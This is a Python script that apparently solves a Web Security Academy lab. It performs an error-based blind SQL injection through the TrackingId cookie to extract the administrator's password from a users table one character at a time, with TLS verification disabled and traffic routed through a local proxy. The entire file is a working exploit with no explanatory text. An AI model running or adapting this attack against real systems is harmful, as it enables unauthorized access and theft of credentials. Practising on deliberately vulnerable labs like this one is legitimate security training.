import sys
import time
import urllib

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def payloadattk():
    # Replace with the target URL
    url = "https://0a2e00810449d5dd80480396003c00f7.web-security-academy.net"

    proxies = {'http': 'http://127.0.0.1:8080',
               'https': 'http://127.0.0.1:8080'}

    passwd = ""
    for x in range(1, 21):
        for y in range(32, 126):
            payload = f"' UNION SELECT CASE WHEN (ascii(SUBSTR(password,{x},1)) = {y}) THEN NULL ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator'--"
            payload_encoded = urllib.parse.quote(payload)
            cookies = {'TrackingId': 'x' + payload_encoded,
                       'session': 'RHKRmoF4ICNWHKBYEgCDGLxb5EIWuw7X'}
            
            sys.stdout.write('\r' + passwd + chr(y))
 
            response = requests.get(url, cookies=cookies,
                         verify=False, proxies=proxies)
            
            if "Internal Server Error" not in response.text:
                passwd += chr(y)
                break


if __name__ == "__main__":
    payloadattk()